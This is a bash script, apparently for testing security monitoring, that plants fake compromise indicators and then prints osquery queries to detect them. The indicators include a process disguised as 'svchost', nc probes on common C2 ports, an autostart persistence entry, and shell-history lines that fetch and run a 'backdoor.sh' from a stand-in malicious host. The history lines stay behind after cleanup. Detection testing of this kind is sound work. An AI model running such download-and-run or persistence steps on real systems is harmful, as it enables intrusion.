#!/bin/bash

# Security Testing Script - Simulated User Compromise Indicators
# Purpose: Generate detectable activities for security monitoring validation
# Use only in controlled testing environments with proper authorization

echo "=== Security Testing Script ==="
echo "Simulating detectable user compromise indicators..."
echo "Timestamp: $(date)"

# 1. Suspicious file creation in temp directories
echo "[*] Creating suspicious files in temp locations..."
touch /tmp/.hidden_backdoor
touch /tmp/suspicious_script.sh
echo "#!/bin/bash" > /tmp/suspicious_script.sh
echo "# Simulated malicious script" >> /tmp/suspicious_script.sh
chmod +x /tmp/suspicious_script.sh

# 2. Unusual network connection simulation (if nc is available)
echo "[*] Simulating suspicious network activity..."
if command -v nc &> /dev/null; then
    # Attempt connection to common C2 ports (will fail but create logs)
    timeout 2 nc -z 8.8.8.8 4444 2>/dev/null || true
    timeout 2 nc -z 8.8.8.8 1337 2>/dev/null || true
fi

# 3. Suspicious process name
echo "[*] Creating process with suspicious name..."
cp /bin/sleep /tmp/svchost
/tmp/svchost 5 &
SUSPICIOUS_PID=$!

# 4. Unusual file modifications
echo "[*] Modifying system-adjacent files..."
touch /tmp/fake_passwd
echo "root:x:0:0:root:/root:/bin/bash" > /tmp/fake_passwd
echo "testuser:x:1000:1000:Test User:/home/testuser:/bin/bash" >> /tmp/fake_passwd

# 5. Suspicious command history simulation
echo "[*] Adding suspicious commands to history..."
echo "wget http://malicious-site.com/backdoor.sh" >> ~/.bash_history
echo "chmod +x backdoor.sh" >> ~/.bash_history
echo "nohup ./backdoor.sh &" >> ~/.bash_history

# 6. Create files with suspicious extensions
echo "[*] Creating files with suspicious extensions..."
touch /tmp/keylogger.exe
touch /tmp/data_exfil.zip
echo "fake encrypted data" > /tmp/encrypted_secrets.gpg

# 7. Modify file timestamps to appear suspicious
echo "[*] Modifying file timestamps..."
touch -t 200101010000 /tmp/timestomp_test.txt

# 8. Create persistence mechanism simulation
echo "[*] Simulating persistence mechanism..."
mkdir -p ~/.config/autostart 2>/dev/null || true
cat > ~/.config/autostart/fake_update.desktop << EOF
[Desktop Entry]
Type=Application
Name=System Update
Exec=/tmp/suspicious_script.sh
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
EOF

# 9. Log file manipulation simulation
echo "[*] Creating suspicious log entries..."
echo "$(date) FAILED LOGIN: root from 192.168.1.100" >> /tmp/fake_auth.log
echo "$(date) SUSPICIOUS: Multiple failed sudo attempts" >> /tmp/fake_auth.log

# 10. Memory dump simulation
echo "[*] Creating memory dump simulation..."
dd if=/dev/urandom of=/tmp/memory_dump.bin bs=1024 count=10 2>/dev/null

echo ""
echo "=== Osquery Detection Queries ==="
echo "Use these queries to detect the simulated compromise:"
echo ""
echo "1. Suspicious files in /tmp:"
echo "SELECT * FROM file WHERE path LIKE '/tmp/%' AND filename LIKE '.%';"
echo ""
echo "2. Processes with suspicious names:"
echo "SELECT * FROM processes WHERE name = 'svchost' AND path LIKE '/tmp/%';"
echo ""
echo "3. Recently modified files:"
echo "SELECT * FROM file WHERE mtime > (strftime('%s', 'now') - 300);"
echo ""
echo "4. Autostart entries:"
echo "SELECT * FROM autoexec WHERE path LIKE '%autostart%';"
echo ""
echo "5. Network connections on suspicious ports:"
echo "SELECT * FROM process_open_sockets WHERE remote_port IN (4444, 1337);"
echo ""

# Cleanup function
cleanup() {
    echo ""
    echo "[*] Cleaning up test artifacts..."
    rm -f /tmp/.hidden_backdoor
    rm -f /tmp/suspicious_script.sh
    rm -f /tmp/svchost
    rm -f /tmp/fake_passwd
    rm -f /tmp/keylogger.exe
    rm -f /tmp/data_exfil.zip
    rm -f /tmp/encrypted_secrets.gpg
    rm -f /tmp/timestomp_test.txt
    rm -f /tmp/fake_auth.log
    rm -f /tmp/memory_dump.bin
    rm -f ~/.config/autostart/fake_update.desktop
    
    # Clean up the suspicious process
    if [ ! -z "$SUSPICIOUS_PID" ]; then
        kill $SUSPICIOUS_PID 2>/dev/null || true
    fi
    
    echo "[*] Cleanup complete!"
}

# Set up cleanup on script exit
trap cleanup EXIT

echo ""
echo "Press Ctrl+C to cleanup and exit..."
echo "Monitoring artifacts are now active. Check with osquery!"

# Keep script running to maintain suspicious process
wait $SUSPICIOUS_PID 2>/dev/null || true